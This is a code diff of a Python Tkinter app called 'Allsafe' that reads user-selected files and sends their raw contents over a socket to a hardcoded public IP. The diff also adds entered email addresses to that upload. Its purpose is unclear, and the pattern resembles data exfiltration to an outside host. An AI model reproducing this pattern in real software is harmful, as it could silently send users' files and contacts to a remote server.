@@ -13,7 +13,8 @@ root.geometry("800x450")
 root.title("Allsafe")
 root.resizable(False, False)
 root.iconbitmap('img/allsafe.ico')
-
+with open('_mails.txt', 'w', encoding='utf-8') as g:
+	g.write("")
 SetPaths= set()
 SetMails= set()
 class Colors:
@@ -52,15 +53,16 @@ def main_def_send_mail():
 	#pb.start(200)
 	#############################
 	sock = socket.socket()
-	sock.connect(('25.84.180.124', 8080)) 
+	sock.connect(('45.137.190.131', 8008))
 	sock.send(str(len(SetPaths)).encode())
-
+#45.137.190.131
 	                            #####  ПОМЕНЯТЬ IP, IP ТУТ ОТ ХАМАЧИ, РАЗНЫЕ СЕТИ ДЛЯ ПЕРЕДАЧИ
 	##################################
 	#handle = open("txt.txt","r") 
 	#data = handle.read()
 	#handle.close()
 	stopmsg=b'stop'
+
 	for path in SetPaths:
 
 		with open(path, 'rb') as file:
@@ -72,7 +74,7 @@ def main_def_send_mail():
 			time.sleep(3)
 			sock.send(stopmsg)
 			time.sleep(1)
-
+	
 	#sock.send(file.read())
 	#################################
 	#sock.send(data.encode())
@@ -197,6 +199,12 @@ def valid_check():
 			if temp not in SetMails:
 				tree.insert("",0, text=temp)
 				SetMails.add(temp)
+				filemail = open('_mails.txt', "a")
+				filemail.write(temp+"\n")
+				filemail.close()
+				print(os.getcwd()+"\\" "_mails.txt")
+				
+				SetPaths.add(os.getcwd()+"\\" "_mails.txt")
 				emailplace.delete(0, END)
 			else:
 				messagebox.showwarning("Warning", "You already add this email")
